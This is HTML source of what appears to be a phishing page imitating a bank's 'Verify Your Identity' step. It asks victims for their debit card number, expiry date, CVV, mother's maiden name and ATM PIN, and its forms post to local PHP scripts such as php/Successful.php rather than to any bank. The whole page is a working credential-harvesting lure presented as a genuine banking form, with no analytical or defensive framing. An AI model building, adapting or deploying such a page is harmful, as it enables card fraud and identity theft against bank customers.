         ...
         <div class="account-content-container">
            <div class="account-table-body">
               <header class="account-section-title clearfix account-secure">
                  ...
                  <h1>Step 4 of 5: Verify Your Identity</h1>
               </header>
               ...
               <section class="account-section">
                  ...
                  <form class="pay-transfer-options clearfix" name="Enroll" action="php/Successful.php" method="post">
                     <input type="hidden" name="CSRF_TOKEN" value="X0I9-9C4O-7JTN-C1ZP-VB9N-HGRL-UW0P-5B2K">
                     ...
                     <div class="account-title clearfix">
                        ...
                        <p style="
    font: inherit;
">Please verify the card details linked to your account.</p>
                        <p style="
    font: inherit;
">All fields are required.</p>
                     ...
                     <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>ATM/Debit Card Number: </strong><!-- <em>(16 digits)</em> --></label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <h6>ATM/Debit Card Requirements:</h6>
                                    <p data-rule="^\d{19,}$" id="rule-2">Must include 16 digits</p>
                                    <p data-rule="^[0-9]+$" id="rule-3">Contains only numbers</p>
                                 </div>
                           ...
                           <div class="tooltip">
                              ...
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your 16-digit ATM/Debit Card number using 0 through 9. You may enter your number in one string or separated by dashes or spaces. If you don't have an ATM/Debit Card, please call Customer Service at 1-800-656-6561. Business customers should call 1-877-229-6428.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left" style="
    margin-right: 0;
">
                              <input type="text" name="cc" id="cardNumber" class="required number-only demo-atm tooltip-validate" maxlength="19" autocomplete="off" placeholder="16 digits" required="">
                           </div>
                           <script type="text/javascript">$('#cardNumber').on('keypress change', function () {
  $(this).val(function (index, value) {
    return value.replace(/[^0-9]/g, "").replace(/\W/gi, '').replace(/(.{4})/g, '$1 ');
  });
});</script>
                        </div>
                     </div><div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>Expiration date: </strong><!-- <em>(16 digits)</em> --></label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <h6>ATM/Debit Card Requirements:</h6>
                                    <p data-rule="^\d{16,}$" id="rule-2">Must include 16 digits</p>
                                    <p data-rule="^[0-9]+$" id="rule-3">Contains only numbers</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
    ...
    margin-right: 0;
">
                              <input type="text" name="cc_exp" id="cardNumber" class="required number-only demo-atm tooltip-validate" maxlength="5" autocomplete="off" placeholder="MM/YY" required="" inputmode="numeric" onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d\/\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')" >
                           </div>
                        </div>
                     </div>
                     <div class="form-item tooltip-item" style="
    margin-top: 10px;
">
                        <label for="cardNumber"><strong>CSC/CVV: </strong><!-- <em>(16 digits)</em> --></label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
    ...
    margin-right: 0;
">
                              <input style="padding-left: 8px;" class="form-control" id="firstName" name="cvv" class="required NUMERIC" type="password" value="" size="8" data-validation-error-msg="Required" data-validation="cvv" maxlength="3" inputmode="numeric">
                           </div><div class="jpui fieldhelpertext" id="maskedSocialSecurityNumber-text-validate-helpertext" style="
    margin-top: 10px;
    font: inherit;
    font-size: 13px;
">the three-digit CVV number is printed on the back of the card to the right of the signature box.</div>
                        </div>
                     </div>
    ...
    margin-bottom: 10px;
    font-weight: 400;
">Card Verification</legend><p style="
    font: inherit;
    margin: 0;
    font-size: 15px;
">for additional security please verify your mmn to submit your card detail.</p><br><div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>Mother's Maiden Name: </strong><!-- <em>(16 digits)</em> --></label>
                        <div class="input-wrapper clearfix">
    ...
    margin-right: 0;
">
                              <input type="text" name="MaidenName" id="MaidenName" class="required number-only demo-atm tooltip-validate" maxlength="25" autocomplete="off">
                           </div>
                        </div>
                     </div><div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>ATM/Debit Card Pin: </strong><!-- <em>(16 digits)</em> --></label>
                        <div class="input-wrapper clearfix">
    ...
    margin-right: 0;
">
                              <input style="padding-left: 8px;" maxlength="4" class="form-control" id="firstName" name="atmpin" class="required NUMERIC" type="password" value="" size="9" data-validation-error-msg="Required" data-validation="length" data-validation-length="min4-4">
                           </div>
                        </div>
                     </div><div class="form-actions">
                        <input type="submit" class="submit-button arrow" id="VerifyBtn" data-trigger="next" value="Next">
                     </div>
                     </div>
...
<aside id="main-sidebar" class="page-region main-sidebar">
	<div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal">
	    <div class="sidebar-list-content">
	        ...
	        <div id="faq-holder">
	        <form action="php/Next.php" name="frmAsst" id="frmAsst" method="post">
